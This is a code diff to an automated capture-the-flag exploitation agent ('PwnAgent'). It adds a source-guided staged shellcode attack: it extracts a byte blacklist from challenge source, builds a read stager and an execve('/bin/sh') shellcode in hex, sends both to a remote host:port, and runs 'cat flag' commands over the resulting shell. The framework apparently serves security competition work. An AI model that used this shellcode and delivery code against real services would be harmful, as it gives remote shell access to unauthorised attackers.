@@ -14,9 +14,12 @@ from __future__ import annotations
 import logging
 import os
 import re
+import socket
 import struct
 import subprocess
+import time
 from typing import Any, Dict, List, Optional
+from urllib.parse import urlparse
 
 from agents.base_agent import BaseAgent, AgentType
 from core.decision_engine.llm_reasoner import LLMReasoner
@@ -122,6 +125,14 @@ class PwnAgent(BaseAgent):
 
         # Phase 1 — mitigations
         steps.extend(self._phase_checksec(binary))
+
+        # Fast path — source-guided executable-stack shellcode challenge.
+        shell_steps, flag_str, handled = self._phase_source_guided_shellcode(binary, files, challenge)
+        steps.extend(shell_steps)
+        if flag_str:
+            return self._result(challenge, "solved", steps, flag=flag_str)
+        if handled:
+            return self._result(challenge, "attempted", steps)
 
         # Phase 2 — Ghidra static analysis
         ghidra_steps, ghidra_functions = self._phase_ghidra(binary)
@@ -343,6 +354,172 @@ class PwnAgent(BaseAgent):
 
         return steps
 
+    def _phase_source_guided_shellcode(
+        self,
+        binary: str,
+        files: List[str],
+        challenge: Dict[str, Any],
+    ) -> tuple[List[str], Optional[str], bool]:
+        steps: List[str] = []
+        source_path = self._find_source_file(files)
+        conn_info = self._extract_connection_info(challenge)
+
+        if not source_path:
+            return steps, None, False
+
+        try:
+            source = open(source_path, encoding="utf-8", errors="ignore").read()
+        except Exception as exc:
+            steps.append(f"Source-guided shellcode skipped; could not read {source_path}: {exc}")
+            return steps, None, False
+
+        if not self._looks_like_execute_buffer_challenge(source):
+            return steps, None, False
+
+        steps.append("Detected source-guided executable-stack shellcode pattern.")
+        blacklist = self._extract_blacklist_bytes(source)
+        if blacklist:
+            steps.append(f"Extracted blacklist with {len(blacklist)} byte(s).")
+
+        stage1 = self._build_badbyte_safe_read_stage(blacklist)
+        stage2 = self._execve_bin_sh_shellcode()
+        if stage1 is None:
+            steps.append("Could not build a first-stage payload that avoids the blacklist.")
+            return steps, None, True
+
+        if not conn_info:
+            steps.append("Source-guided shellcode needs a remote host:port; none found in challenge metadata or description.")
+            return steps, None, True
+
+        remote_steps, flag = self._send_staged_shell_remote(
+            conn_info,
+            stage1,
+            stage2,
+            commands=[
+                b"cat flag.txt\n",
+                b"cat /flag.txt\n",
+                b"cat flag\n",
+            ],
+        )
+        steps.extend(remote_steps)
+        return steps, flag, True
+
+    @staticmethod
+    def _find_source_file(files: List[str]) -> Optional[str]:
+        for path in files:
+            if str(path).lower().endswith((".c", ".cc", ".cpp")) and os.path.exists(path):
+                return str(path)
+        return None
+
+    @staticmethod
+    def _looks_like_execute_buffer_challenge(source: str) -> bool:
+        compact = re.sub(r"\s+", " ", source)
+        return (
+            "read(0" in compact
+            and "blacklist" in compact.lower()
+            and re.search(r"\(\s*\(\s*void\s*\(\s*\*\s*\)\s*\(\s*\)\s*\)\s*\w+\s*\)\s*\(\s*\)", compact)
+            is not None
+        )
+
+    @staticmethod
+    def _extract_blacklist_bytes(source: str) -> bytes:
+        match = re.search(r"blacklist\s*\[[^\]]*\]\s*=\s*\"((?:\\.|[^\"\\])*)\"", source, re.S)
+        if not match:
+            return b""
+
+        raw = match.group(1)
+        out = bytearray()
+        i = 0
+        while i < len(raw):
+            ch = raw[i]
+            if ch != "\\":
+                out.append(ord(ch) & 0xff)
+                i += 1
+                continue
+            if i + 1 >= len(raw):
+                break
+            nxt = raw[i + 1]
+            if nxt == "x" and i + 3 < len(raw):
+                try:
+                    out.append(int(raw[i + 2:i + 4], 16))
+                    i += 4
+                    continue
+                except ValueError:
+                    pass
+            escapes = {"n": 0x0a, "r": 0x0d, "t": 0x09, "0": 0x00, "\\": 0x5c, '"': 0x22}
+            out.append(escapes.get(nxt, ord(nxt) & 0xff))
+            i += 2
+        return bytes(out)
+
+    @staticmethod
+    def _build_badbyte_safe_read_stage(blacklist: bytes) -> Optional[bytes]:
+        # At the vulnerable call site for this challenge family, rdx points at
+        # the input buffer and rax is already 0. Read stage two into buf+0x10 so
+        # the read syscall does not overwrite the jmp instruction before it runs.
+        stage = bytes.fromhex("31ff488d72106a7f5a0f05ffe6")
+        bad = set(blacklist)
+        if any(byte in bad for byte in stage):
+            return None
+        return stage
+
+    @staticmethod
+    def _execve_bin_sh_shellcode() -> bytes:
+        return bytes.fromhex("4831f65648bf2f62696e2f2f736857545f6a3b58990f05")
+
+    def _send_staged_shell_remote(
+        self,
+        conn_info: str,
+        stage1: bytes,
+        stage2: bytes,
+        *,
+        commands: List[bytes],
+    ) -> tuple[List[str], Optional[str]]:
+        steps: List[str] = []
+        parsed = self._parse_host_port(conn_info)
+        if parsed is None:
+            steps.append(f"Could not parse connection_info: {conn_info!r}")
+            return steps, None
+        host, port = parsed
+        steps.append(f"Sending staged shellcode exploit to remote {host}:{port}...")
+
+        try:
+            with socket.create_connection((host, port), timeout=10) as sock:
+                sock.settimeout(2)
+                try:
+                    banner = sock.recv(4096).decode("utf-8", errors="replace")
+                    if banner.strip():
+                        steps.append(f"Remote banner: {banner[:200]!r}")
+                except socket.timeout:
+                    pass
+
+                sock.sendall(stage1)
+                time.sleep(0.15)
+                sock.sendall(stage2)
+                time.sleep(0.25)
+
+                output = ""
+                for command in commands:
+                    sock.sendall(command)
+                    time.sleep(0.25)
+                    try:
+                        chunk = sock.recv(4096).decode("utf-8", errors="replace")
+                    except socket.timeout:
+                        chunk = ""
+                    output += chunk
+                    flag = find_first_flag(output)
+                    if flag:
+                        preview = output[:300].replace("\n", " ")
+                        steps.append(f"Staged shell output: {preview!r}")
+                        steps.append(f"Flag found via staged shellcode: {flag}")
+                        return steps, flag
+
+                preview = output[:300].replace("\n", " ")
+                steps.append(f"Staged shell output: {preview!r}")
+        except Exception as exc:
+            steps.append(f"Staged shellcode exploit failed: {exc}")
+
+        return steps, None
+
     # ------------------------------------------------------------------
     # ret2win helpers
     # ------------------------------------------------------------------
@@ -531,12 +708,11 @@ class PwnAgent(BaseAgent):
         self, conn_info: str, payload: bytes
     ) -> tuple[List[str], Optional[str]]:
         steps: List[str] = []
-        try:
-            host, port_str = conn_info.rsplit(":", 1)
-            port = int(port_str)
-        except (ValueError, AttributeError):
+        parsed = self._parse_host_port(conn_info)
+        if parsed is None:
             steps.append(f"Could not parse connection_info: {conn_info!r}")
             return steps, None
+        host, port = parsed
 
         steps.append(f"Sending payload to remote {host}:{port}...")
 
@@ -574,6 +750,48 @@ class PwnAgent(BaseAgent):
             steps.append(f"Remote delivery failed: {exc}")
 
         return steps, None
+
+    def _extract_connection_info(self, challenge: Dict[str, Any]) -> Optional[str]:
+        for key in ("connection_info", "remote", "target"):
+            value = challenge.get(key)
+            if isinstance(value, str):
+                parsed = self._parse_host_port(value)
+                if parsed:
+                    return f"{parsed[0]}:{parsed[1]}"
+            elif isinstance(value, dict):
+                host = value.get("host") or value.get("ip")
+                port = value.get("port")
+                if host and port:
+                    return f"{host}:{port}"
+                for sub_value in value.values():
+                    if isinstance(sub_value, str):
+                        parsed = self._parse_host_port(sub_value)
+                        if parsed:
+                            return f"{parsed[0]}:{parsed[1]}"
+
+        for key in ("url", "rpc_url", "flag_url"):
+            value = challenge.get(key)
+            if isinstance(value, str):
+                parsed = self._parse_host_port(value)
+                if parsed:
+                    return f"{parsed[0]}:{parsed[1]}"
+
+        text = " ".join([
+            str(challenge.get("name", "")),
+            str(challenge.get("description", "")),
+        ])
+        match = re.search(r"\b((?:\d{1,3}\.){3}\d{1,3}|[A-Za-z0-9_.-]+)\s*:\s*(\d{2,5})\b", text)
+        if match:
+            return f"{match.group(1)}:{int(match.group(2))}"
+        return None
+
+    @staticmethod
+    def _parse_host_port(value: str) -> Optional[tuple[str, int]]:
+        value = str(value).strip()
+        parsed = urlparse(value if re.match(r"^\w+://", value) else f"tcp://{value}")
+        if parsed.hostname and parsed.port:
+            return parsed.hostname, int(parsed.port)
+        return None
 
     # ------------------------------------------------------------------
     # Lazy loaders
